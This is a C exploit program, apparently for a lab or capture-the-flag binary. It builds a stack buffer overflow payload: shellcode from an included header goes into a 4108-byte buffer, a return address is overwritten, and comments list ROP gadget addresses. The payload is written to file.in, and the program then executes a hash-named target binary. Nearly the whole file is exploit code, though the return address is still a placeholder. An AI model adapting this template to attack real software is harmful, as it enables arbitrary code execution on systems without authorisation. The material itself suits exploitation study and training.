#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

unsigned char shellcode[] = {
#include "shellcode.h"
};

int main(void)
{
  struct _overflow {
    char buf[4108];       /* buffer that we overflow */
    // uint32_t fill1;      /* ROP gadget or chained function */
    // uint32_t fill2;    /* argument 1 to chained function or gadget */
    uint32_t ret1;    /* First address of ROP gadget */
    /* ... */
    // uint32_t ret2;      /* ROP gadget or chained function */
    // uint32_t arg2_1;    /* argument 1 to chained function or gadget */
    // uint32_t arg2_2;    /* argument 2 to chained function or gadget */
    // unsigned char ter[1];            /* terminator */
    /* ... */
  } __attribute__((packed)) overflow;

  /* fill with A's */
  memset(&overflow, 'A', sizeof(overflow));

  /* place the shellcode in the beginning of the buffer */
  memcpy(overflow.buf, shellcode, sizeof(shellcode));

  /* overwrite the return address */
  // overflow.fill1 = 0xffffffff;
  overflow.ret1 = 0xffffffff;
  // overflow.ret2 = 0xffffffff;
  // overflow.ter[0] = '\0';

  /*  Gadget 0x8048589  
        -> Moves eax to [esp+0x4]
        -> Moves 0x804a048 to esp
        -> Calls edx


      Gadget 0x80485df
        -> Calls eax
  */

  /* create or open file */
  int fd = open("file.in", O_WRONLY | O_CREAT, 0644);

  /* make sure file is empty */
  ftruncate(fd, 0);

  /* write file contents */
  write(fd, (char*)&overflow, sizeof(overflow));

  /* close the file */
  close(fd);

  char *argv[] = { "./edde351fa884c1f0e6c7b8c457fb97358058b956", NULL };

  execve(argv[0], argv, NULL);

  return EXIT_FAILURE;
}
